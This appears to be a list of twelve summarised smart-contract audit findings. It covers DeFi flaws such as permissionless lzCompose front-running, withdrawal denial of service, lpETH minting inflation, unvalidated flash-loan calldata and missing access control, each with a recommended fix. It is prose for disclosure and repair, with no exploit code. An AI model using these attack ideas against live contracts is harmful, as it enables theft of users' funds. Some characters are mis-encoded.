## 1. [High] Dual transaction nature of composed message transfer allows anyone to steal user funds

### Restricts the lzCompose(‚Ä¶) method

- Summary: Sending OFTs via `lzCompose(‚Ä¶)` is permissionless, allowing anyone to invoke it. Adversaries can monitor for incoming OFTs and use them before legitimate processing, stealing user funds. If `lzCompose(‚Ä¶)` fails, adversaries can exploit retries before users, misusing the OFTs.

- Impact & Recommendation: An immediate but temporary fix restricts the lzCompose(‚Ä¶) method to trusted or whitelisted executors. Alternatively, a design change is proposed, involving directly implementing `lzReceive(‚Ä¶)` to eliminate the need for a composed message altogether.

## 2. [Medium] ASDRouter didn‚Äôt call ASDUSDC.approve() to to grant permission for crocSwapAddress to spend their ASDUSDC

### Lack of allowance

- Summary: The function `ASDRouter#lzCompose()` fails because the necessary allowance is not set for `crocSwapAddres**s**` to spend ASDUSDC tokens. This prevents the successful swap of ASDUSDC for NOTE, resulting in a failed execution of `_swapOFTForNote()` and refunding all ASDUSDC to the designated receiver.

- Impact & Recommendation: Set¬†`allowance`¬†to the maximum value.

## 3.[High] DOS of completeQueuedWithdrawal when ERC20 buffer is filled

### Restricted access

- Summary: The OperatorDelegator::completeQueuedWithdrawal function in the code tries to fill the ERC20 withdrawal buffer but fails because it calls depositQueue::fillERC20withdrawBuffer, which is restricted to be accessed only by the RestakeManager contract. This restriction causes the function call to revert, leading to a Denial of Service (DoS) that prevents the completion of withdrawals and the retrieval of funds from EigenLayer (EL), resulting in a potential loss of funds for the protocol and its users.

- Impact & Recommendation: The simplest solution is to remove the onlyRestakeManager modifier from the depositQueue::fillERC20withdrawBuffer function, allowing anyone to call it.

## 4.[High] Availability of deposit invariant can be bypassed

### ETH deposits influence lpETH minting

- Summary: The issue in the PrelaunchPoints.sol contract arises during the claiming of lpETH, where non-ETH/WETH LRT tokens are swapped to ETH using \_fillQuote(), and this ETH is subsequently used to mint lpETH. The vulnerability occurs because any ETH transferred directly to the contract before calling claim() is also included in the minting calculation. This allows users to bypass the intended lock-up period and artificially inflate their lpETH holdings beyond their initial LRT stake.

- Impact & Recommendation: To mitigate this, it is crucial to modify the contract so that only ETH obtained from LRT swaps is used for minting lpETH, and to prevent any additional ETH deposits from influencing the lpETH minting process.

## 5.[High] Attacker can frontrun user‚Äôs withdrawals to make them revert without costs

### Valid nft owner

- Summary: The `withdraw` method can be indefinitely blocked by repeatedly depositing 1 WEI with others' IDs just before each block, preventing withdrawals and creating a denial-of-service attack at minimal cost.

- Impact & Recommendation: Mitigations include preventing deposits to unowned dNFT tokens, allowing deposits only through licensed vaults to impose a real cost on attackers, and updating `idToBlockOfLastDeposit` only for vaults licensed by `vaultLicenser` or `keroseneManager`.

## 6.[Medium] VestingMaster: Banning account causes future rewards in RevenueSharingVault to get lost and tokens are stuck

### Ban accounts

- Summary: In the VestingMaster and IndividualVestingVault contracts, the owner of VestingMaster can ban accounts from calling IndividualVestingVault.claim(). This prevents the banned accounts from withdrawing their shares, causing these shares to remain indefinitely in the vault. Consequently, any future revenue generated by these shares is lost forever.

- Impact & recommendation: When an account is banned, its Vault shares are now redeemed for TRNDO tokens and sent to the owner of VestingMaster, ensuring no TRNDO tokens get stuck and future revenue is preserved.

## 7.[High] Adversary can make honest parties unable to retrieve their assertion stakes if the required amount is decreased

### Validators steal funds

- Summary: The vulnerability in RollupUserLogic.sol allows adversary validators who have lost a challenge to steal funds from honest validators by exploiting the setBaseStake function. When the baseStake is decreased, the adversary can manipulate the system by creating new assertions with a reduced stake, ultimately allowing them to withdraw more funds than they initially staked.

- Impact & Recommendation: This flaw permits adversaries to exploit the system and steal from honest validators, necessitating a fix to prevent adversary validators from reclaiming their funds through the current tracking system.

## 8.[Medium] BalancerFlashLender#receiveFlashLoan does not validate the originalCallData

### validate originalCallData

- Summary: The `BalancerFlashLender::receiveFlashLoan` function fails to validate the `originalCallData`, allowing an attacker to execute arbitrary Strategy instructions. This vulnerability enables an attacker to initiate a flash loan from another contract and execute any function such as `_supplyBorrow`, `_repayAndWithdraw`, or `_payDebt` within StrategyLeverage.

- Impact & Recommendation: To mitigate this, the `BalancerFlashLender::flashLoan` function should record the parameters called via a hash and verify this hash in the `receiveFlashLoan` function.

## 9.[High] validateAndUpdateVaultStakeInDSS() forwards incorrect operator address to finishUpdateStakeHook()

### `msg.sender` as the operator address

- Summary: A vulnerability in the `validateAndUpdateVaultStakeInDSS` function of the `DSS` protocol incorrectly forwards the `msg.sender` as the operator address to the `finishUpdateStakeHook`. This can lead to unauthorized addresses being treated as operators, potentially causing incorrect registration for rewards or other associated logic.

- Impact & Recommendation: it is recommended to include the operator address in the `QueuedStakeUpdate` structure and forward the correct operator address to the `finishUpdateStakeHook` in `validateAndUpdateVaultStakeInDSS`.

## 10.[High] Arbitrary tokens and data can be bridged to GnosisTargetDispenserL2 to manipulate staking incentives

### not verify the message or the token received

- Summary: The `GnosisTargetDispenserL2` contract can be exploited because its `onTokenBridged()` callback does not verify the sender of message or the token received. This allows attackers to send any tokens with fake staking data, which the contract processes as valid, leading to potential redistribution of withheld funds or storage of amounts for later redemption.

- Impact & Recommendation: It is recommended to separate token bridging and staking data transmission, removing the `onTokenBridged()` callback to ensure staking data is validated from an authentic L1 source.

## 11.[High] Unauthorized Access to setCurves Function

### Modifiers like `onlyOwner` or `onlyManager`

- Summary: The `FeeSplitter.sol` contract has a critical vulnerability in the `setCurves` function, allowing any user to update the reference to the Curves contract. This can be exploited by attackers to redirect the reference to a malicious Curves contract, enabling manipulation of token balances and supplies. As a result, attackers can falsely inflate their claimable fees, leading to unauthorized profit.

- Impact & Recommendation: The `setCurves` function should be restricted to be callable only by the contract owner or a trusted manager using appropriate access control modifiers like `onlyOwner` or `onlyManager`.

## 12.[High] Merging tranches could make \_loanTermination() accounting incorrect

### No access control of loanId changes distrupt accouting logic

- Summary: The issue arises when tranches in the `Loan` contract are merged by the `mergeTranches()` function, altering the `loanId` of the merged tranches. This process is currently unrestricted, allowing anyone to trigger it. Such changes can disrupt the accounting logic of the `Pool` contract, which relies on the `loanId` for accurate internal accounting.

- Impact & Recommendation: The recommended mitigation is to restrict the `mergeTranches()` function so that only lenders can call it, ensuring accountability.
